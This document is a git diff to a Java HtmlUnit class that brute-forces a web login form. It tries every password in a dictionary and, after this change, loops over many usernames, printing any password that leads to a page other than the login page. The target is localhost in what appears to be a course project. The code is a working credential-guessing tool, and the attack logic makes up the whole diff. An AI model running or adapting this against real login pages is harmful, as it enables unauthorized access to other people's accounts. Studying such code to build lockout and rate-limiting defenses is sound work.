@@ -5,6 +5,7 @@ import com.gargoylesoftware.htmlunit.WebClient;
 import com.gargoylesoftware.htmlunit.html.*;
 
 import java.io.IOException;
+import java.lang.reflect.Array;
 import java.util.ArrayList;
 
 public class FormLogin {
@@ -17,6 +18,8 @@ public class FormLogin {
     int maxLength;
     String characterSpace;
 
+    boolean manyUsernames;
+
     WebClient client;
     HtmlPage page;
     HtmlForm form;
@@ -27,7 +30,16 @@ public class FormLogin {
         this.url = url;
     }
 
-    public void setup(){
+    public FormLogin(String url, String username, ArrayList<String> dictionary, ArrayList<String> usernames) {
+        this.username = username;
+        this.dictionary = dictionary;
+        this.url = url;
+        this.usernames = usernames;
+        manyUsernames = true;
+    }
+
+
+    public void setup() {
         client = new WebClient();
 
         try {
@@ -40,7 +52,19 @@ public class FormLogin {
 
     public void login() {
 
+        if (manyUsernames) {
 
+            for (String n : usernames) {
+                System.out.println("Using username: " + n);
+                username = n;
+                startAttempts();
+            }
+        } else {
+            startAttempts();
+        }
+    }
+
+    public void startAttempts() {
         for (int i = 0; i < dictionary.size(); i++) {
 
             try {
@@ -53,19 +77,15 @@ public class FormLogin {
 
                 HtmlElement button = form.getElementsByAttribute("input", "value", "Submit").get(0);
 
-//            DomElement button = page.createElement("button");
-//            button.setAttribute("type", "submit");
-//            form.appendChild(button);
-                //     Page result = button.click();
-
                 Page result = button.click();
                 String resultUrl = result.getUrl().toString();
 
-                if(resultUrl.equals("http://localhost/3200-project/success.html")){
+                if (resultUrl.equals("http://localhost/3200-project/index.php")) {
+                    System.out.println("Failed attempt with password: " + password);
+
+                } else {
                     System.out.println("Success! Password is " + password);
                     break;
-                } else {
-                    System.out.println("Failed attempt with password: " + password);
                 }
 
 
@@ -75,7 +95,6 @@ public class FormLogin {
 
         }
     }
-
 
 
 }
